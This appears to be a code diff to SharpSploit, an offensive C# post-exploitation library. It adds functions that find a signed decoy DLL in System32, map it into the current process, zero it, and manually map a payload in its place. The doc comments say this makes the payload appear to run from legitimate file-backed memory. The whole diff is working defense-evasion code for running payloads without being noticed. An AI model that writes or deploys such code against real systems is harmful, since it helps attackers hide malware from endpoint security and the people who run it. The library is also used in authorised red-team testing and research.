@@ -11,6 +11,8 @@ using System.Runtime.InteropServices;
 
 using Execute = SharpSploit.Execution;
 using System.Collections.Generic;
+using System.Security.Cryptography.X509Certificates;
+using System.Linq;
 
 namespace SharpSploit.Execution.DynamicInvoke
 {
@@ -68,6 +70,53 @@ namespace SharpSploit.Execution.DynamicInvoke
             }
 
             return hModule;
+        }
+
+        /// <summary>
+        /// Maps a DLL from disk into a Section.
+        /// </summary>
+        /// <author>The Wover (@TheRealWover), Ruben Boonen (@FuzzySec)</author>
+        /// <param name="DLLPath">Full path fo the DLL on disk.</param>
+        /// <returns>PE.PE_MANUAL_MAP</returns>
+        public static PE.PE_MANUAL_MAP MapModuleFromDisk(string DLLPath)
+        {
+            // Check file exists
+            if (!File.Exists(DLLPath))
+            {
+                throw new InvalidOperationException("Filepath not found.");
+            }
+
+            // Open file handle
+            Execute.Native.UNICODE_STRING ObjectName = new Execute.Native.UNICODE_STRING();
+            Native.RtlInitUnicodeString(ref ObjectName, (@"\??\" + DLLPath));
+            IntPtr pObjectName = Marshal.AllocHGlobal(Marshal.SizeOf(ObjectName));
+            Marshal.StructureToPtr(ObjectName, pObjectName, true);
+
+            Execution.Native.OBJECT_ATTRIBUTES oa = new Execute.Native.OBJECT_ATTRIBUTES();
+            oa.Length = Marshal.SizeOf(oa);
+            oa.ObjectName = pObjectName;
+            oa.Attributes = 0x40; // OBJ_CASE_INSENSITIVE
+
+            Execution.Native.IO_STATUS_BLOCK iob = new Execute.Native.IO_STATUS_BLOCK();
+
+            IntPtr hFile = IntPtr.Zero;
+            Native.NtOpenFile(ref hFile, Execute.Win32.Kernel32.FileAccessFlags.FILE_READ_DATA | Execute.Win32.Kernel32.FileAccessFlags.FILE_EXECUTE | Execute.Win32.Kernel32.FileAccessFlags.FILE_READ_ATTRIBUTES | Execute.Win32.Kernel32.FileAccessFlags.SYNCHRONIZE, ref oa, ref iob, Execute.Win32.Kernel32.FileShareFlags.FILE_SHARE_READ | Execute.Win32.Kernel32.FileShareFlags.FILE_SHARE_DELETE, Execute.Win32.Kernel32.FileOpenFlags.FILE_SYNCHRONOUS_IO_NONALERT | Execute.Win32.Kernel32.FileOpenFlags.FILE_NON_DIRECTORY_FILE);
+
+            // Create section from hFile
+            IntPtr hSection = IntPtr.Zero;
+            ulong MaxSize = 0;
+            Execution.Native.NTSTATUS ret = Native.NtCreateSection(ref hSection, (UInt32)Execution.Win32.WinNT.ACCESS_MASK.SECTION_ALL_ACCESS, IntPtr.Zero, ref MaxSize, Execution.Win32.WinNT.PAGE_READONLY, Execution.Win32.WinNT.SEC_IMAGE, hFile);
+
+            // Map view of file
+            IntPtr pBaseAddress = IntPtr.Zero;
+            Native.NtMapViewOfSection(hSection, (IntPtr)(-1), ref pBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref MaxSize, 0x2, 0x0, Execution.Win32.WinNT.PAGE_READWRITE);
+
+            // Prepare return object
+            PE.PE_MANUAL_MAP SecMapObject = new PE.PE_MANUAL_MAP();
+            SecMapObject.PEINFO = GetPeMetaData(pBaseAddress);
+            SecMapObject.ModuleBase = pBaseAddress;
+
+            return SecMapObject;
         }
 
         /// <summary>
@@ -1069,6 +1118,272 @@ namespace SharpSploit.Execution.DynamicInvoke
             ManMapObject.PEINFO = PEINFO;
 
             return ManMapObject;
+        }
+
+        /// <summary>
+        /// Locate a module with a minimum size which can be used for overloading.
+        /// </summary>
+        /// <author>The Wover (@TheRealWover)</author>
+        /// <param name="MinSize">Minimum module byte size.</param>
+        /// <returns>String, either a full path for the candidate module or String.Empty</returns>
+        public static string FindDecoyModule(long MinSize)
+        {
+            bool HasValidSignature(string FilePath)
+            {
+                X509Certificate2 FileCertificate;
+                try
+                {
+                    X509Certificate TheSigner = X509Certificate.CreateFromSignedFile(FilePath);
+                    FileCertificate = new X509Certificate2(TheSigner);
+                }
+                catch
+                {
+                    return false;
+                }
+
+                X509Chain CertificateChain = new X509Chain();
+                CertificateChain.ChainPolicy.RevocationFlag = X509RevocationFlag.EntireChain;
+                CertificateChain.ChainPolicy.RevocationMode = X509RevocationMode.Offline;
+                CertificateChain.ChainPolicy.VerificationFlags = X509VerificationFlags.NoFlag;
+
+                return CertificateChain.Build(FileCertificate);
+            }
+
+            string SystemDirectoryPath = Environment.GetEnvironmentVariable("WINDIR") + "\\System32";
+            List<string> files = new List<string>(Directory.GetFiles(SystemDirectoryPath, "*.dll"));
+            foreach (ProcessModule Module in Process.GetCurrentProcess().Modules)
+            {
+                if (files.Any(s => s.Equals(Module.FileName, StringComparison.OrdinalIgnoreCase)))
+                {
+                    files.RemoveAt(files.FindIndex(x => x.Equals(Module.FileName, StringComparison.OrdinalIgnoreCase)));
+                    continue;
+                }
+            }
+
+            Random r = new Random();
+            List<int> candidates = new List<int>();
+            while (candidates.Count != files.Count)
+            {
+                int rInt = r.Next(0, files.Count);
+                string currentCandidate = files[rInt];
+
+                if (candidates.Contains(rInt) == false &&
+                    new FileInfo(currentCandidate).Length >= MinSize &&
+                    HasValidSignature(currentCandidate) == true)
+                {
+                    return currentCandidate;
+                }
+                candidates.Add(rInt);
+            }
+            return String.Empty;
+        }
+
+        /// <summary>
+        /// Manually map module into current process starting at the specified base address.
+        /// </summary>
+        /// <author>The Wover (@TheRealWover), Ruben Boonen (@FuzzySec)</author>
+        /// <param name="ModuleByteArray">Full byte array of the module.</param>
+        /// <param name="ModuleMemoryBase">Base address of the module in memory.</param>
+        /// <returns>PE_MANUAL_MAP object</returns>
+        public static PE.PE_MANUAL_MAP MapModuleToMemoryAddress(byte[] ModuleByteArray, IntPtr ModuleMemoryBase)
+        {
+            // Verify process & architecture
+            Boolean isWOW64 = Native.NtQueryInformationProcessWow64Information((IntPtr)(-1));
+            if (IntPtr.Size == 4 && isWOW64)
+            {
+                throw new InvalidOperationException("Manual mapping in WOW64 is not supported.");
+            }
+
+            // Alloc module into memory for parsing
+            IntPtr ModlePointer = FileToMemoryPointer(ModuleByteArray);
+
+            // Fetch PE meta data
+            PE.PE_META_DATA PEINFO = GetPeMetaData(ModlePointer);
+
+            // Check module matches the process architecture
+            if ((PEINFO.Is32Bit && IntPtr.Size == 8) || (!PEINFO.Is32Bit && IntPtr.Size == 4))
+            {
+                Marshal.FreeHGlobal(ModlePointer);
+                throw new InvalidOperationException("The module architecture does not match the process architecture.");
+            }
+
+            UInt32 SizeOfHeaders = 0;
+            if (PEINFO.Is32Bit)
+            {
+                SizeOfHeaders = PEINFO.OptHeader32.SizeOfHeaders;
+            }
+            else
+            {
+                SizeOfHeaders = PEINFO.OptHeader64.SizeOfHeaders;
+            }
+
+            // Write PE header to memory
+            UInt32 BytesWritten = Native.NtWriteVirtualMemory((IntPtr)(-1), ModuleMemoryBase, ModlePointer, SizeOfHeaders);
+
+            // Write sections to memory
+            foreach (PE.IMAGE_SECTION_HEADER ish in PEINFO.Sections)
+            {
+                // Calculate offsets
+                IntPtr pVirtualSectionBase = (IntPtr)((UInt64)ModuleMemoryBase + ish.VirtualAddress);
+                IntPtr pRawSectionBase = (IntPtr)((UInt64)ModlePointer + ish.PointerToRawData);
+
+                // Write data
+                BytesWritten = Native.NtWriteVirtualMemory((IntPtr)(-1), pVirtualSectionBase, pRawSectionBase, ish.SizeOfRawData);
+                if (BytesWritten != ish.SizeOfRawData)
+                {
+                    throw new InvalidOperationException("Failed to write to memory.");
+                }
+            }
+
+            // Perform relocations
+            RelocateModule(PEINFO, ModuleMemoryBase);
+
+            // Rewrite IAT
+            RewriteModuleIAT(PEINFO, ModuleMemoryBase);
+
+            // Set memory protections
+            SetModuleSectionPermissions(PEINFO, ModuleMemoryBase);
+
+            // Free temp HGlobal
+            Marshal.FreeHGlobal(ModlePointer);
+
+            // Prepare return object
+            PE.PE_MANUAL_MAP ManMapObject = new PE.PE_MANUAL_MAP();
+            ManMapObject.ModuleBase = ModuleMemoryBase;
+            ManMapObject.PEINFO = PEINFO;
+
+            return ManMapObject;
+        }
+
+        /// <summary>
+        /// Load a signed decoy module into memory creating legitimate file-backed memory sections within the process. Afterwards overload that
+        /// module by manually mapping a payload in it's place causing the payload to execute from what appears to be file-backed memory.
+        /// </summary>
+        /// <author>The Wover (@TheRealWover), Ruben Boonen (@FuzzySec)</author>
+        /// <param name="PayloadPath">Full path to the payload module on disk.</param>
+        /// <param name="DecoyModulePath">Optional, full path the decoy module to overload in memory.</param>
+        /// <returns>PE.PE_MANUAL_MAP</returns>
+        public static PE.PE_MANUAL_MAP OverloadModule(string PayloadPath, string DecoyModulePath = null)
+        {
+            // Verify process & architecture
+            Boolean isWOW64 = Native.NtQueryInformationProcessWow64Information((IntPtr)(-1));
+            if (IntPtr.Size == 4 && isWOW64)
+            {
+                throw new InvalidOperationException("Module overloading in WOW64 is not supported.");
+            }
+
+            // Get approximate size of Payload
+            if (!File.Exists(PayloadPath))
+            {
+                throw new InvalidOperationException("Payload filepath not found.");
+            }
+            byte[] PayloadFileBytes = File.ReadAllBytes(PayloadPath);
+
+            // Did we get a DecoyModule?
+            if (!String.IsNullOrEmpty(DecoyModulePath))
+            {
+                if (!File.Exists(DecoyModulePath))
+                {
+                    throw new InvalidOperationException("Decoy filepath not found.");
+                }
+                byte[] DecoyFileBytes = File.ReadAllBytes(DecoyModulePath);
+                if (DecoyFileBytes.Length < PayloadFileBytes.Length)
+                {
+                    throw new InvalidOperationException("Decoy module is too small to host the payload.");
+                }
+            } else
+            {
+                DecoyModulePath = FindDecoyModule(PayloadFileBytes.Length);
+                if (String.IsNullOrEmpty(DecoyModulePath))
+                {
+                    throw new InvalidOperationException("Failed to find suitable decoy module.");
+                }
+            }
+
+            // Map decoy from disk
+            Execution.PE.PE_MANUAL_MAP DecoyMetaData = MapModuleFromDisk(DecoyModulePath);
+            IntPtr RegionSize = IntPtr.Zero;
+            if (DecoyMetaData.PEINFO.Is32Bit)
+            {
+                RegionSize = (IntPtr)(DecoyMetaData.PEINFO.OptHeader32.SizeOfImage);
+            } else
+            {
+                RegionSize = (IntPtr)(DecoyMetaData.PEINFO.OptHeader64.SizeOfImage);
+            }
+            // Change permissions to RW
+            Native.NtProtectVirtualMemory((IntPtr)(-1), ref DecoyMetaData.ModuleBase, ref RegionSize, Execution.Win32.WinNT.PAGE_READWRITE);
+
+            // Zero out memory
+            Native.RtlZeroMemory(DecoyMetaData.ModuleBase, (int)RegionSize);
+
+            // Overload module in memory
+            PE.PE_MANUAL_MAP OverloadedModuleMetaData = MapModuleToMemoryAddress(PayloadFileBytes, DecoyMetaData.ModuleBase);
+            OverloadedModuleMetaData.DecoyModule = DecoyModulePath;
+
+            return OverloadedModuleMetaData;
+        }
+
+        /// <summary>
+        /// Load a signed decoy module into memory creating legitimate file-backed memory sections within the process. Afterwards overload that
+        /// module by manually mapping a payload in it's place causing the payload to execute from what appears to be file-backed memory.
+        /// </summary>
+        /// <author>The Wover (@TheRealWover), Ruben Boonen (@FuzzySec)</author>
+        /// <param name="PayloadByteArray">Full byte array for the payload module.</param>
+        /// <param name="DecoyModule">Optional, full path the decoy module to overload in memory.</param>
+        /// <returns>PE.PE_MANUAL_MAP</returns>
+        public static PE.PE_MANUAL_MAP OverloadModule(byte[] PayloadFileBytes, string DecoyModulePath = null)
+        {
+            // Verify process & architecture
+            Boolean isWOW64 = Native.NtQueryInformationProcessWow64Information((IntPtr)(-1));
+            if (IntPtr.Size == 4 && isWOW64)
+            {
+                throw new InvalidOperationException("Module overloading in WOW64 is not supported.");
+            }
+
+            // Did we get a DecoyModule?
+            if (!String.IsNullOrEmpty(DecoyModulePath))
+            {
+                if (!File.Exists(DecoyModulePath))
+                {
+                    throw new InvalidOperationException("Decoy filepath not found.");
+                }
+                byte[] DecoyFileBytes = File.ReadAllBytes(DecoyModulePath);
+                if (DecoyFileBytes.Length < PayloadFileBytes.Length)
+                {
+                    throw new InvalidOperationException("Decoy module is too small to host the payload.");
+                }
+            }
+            else
+            {
+                DecoyModulePath = FindDecoyModule(PayloadFileBytes.Length);
+                if (String.IsNullOrEmpty(DecoyModulePath))
+                {
+                    throw new InvalidOperationException("Failed to find suitable decoy module.");
+                }
+            }
+
+            // Map decoy from disk
+            Execution.PE.PE_MANUAL_MAP DecoyMetaData = MapModuleFromDisk(DecoyModulePath);
+            IntPtr RegionSize = IntPtr.Zero;
+            if (DecoyMetaData.PEINFO.Is32Bit)
+            {
+                RegionSize = (IntPtr)(DecoyMetaData.PEINFO.OptHeader32.SizeOfImage);
+            }
+            else
+            {
+                RegionSize = (IntPtr)(DecoyMetaData.PEINFO.OptHeader64.SizeOfImage);
+            }
+            // Change permissions to RW
+            Native.NtProtectVirtualMemory((IntPtr)(-1), ref DecoyMetaData.ModuleBase, ref RegionSize, Execution.Win32.WinNT.PAGE_READWRITE);
+
+            // Zero out memory
+            Native.RtlZeroMemory(DecoyMetaData.ModuleBase, (int)RegionSize);
+
+            // Overload module in memory
+            PE.PE_MANUAL_MAP OverloadedModuleMetaData = MapModuleToMemoryAddress(PayloadFileBytes, DecoyMetaData.ModuleBase);
+            OverloadedModuleMetaData.DecoyModule = DecoyModulePath;
+
+            return OverloadedModuleMetaData;
         }
 
         /// <summary>
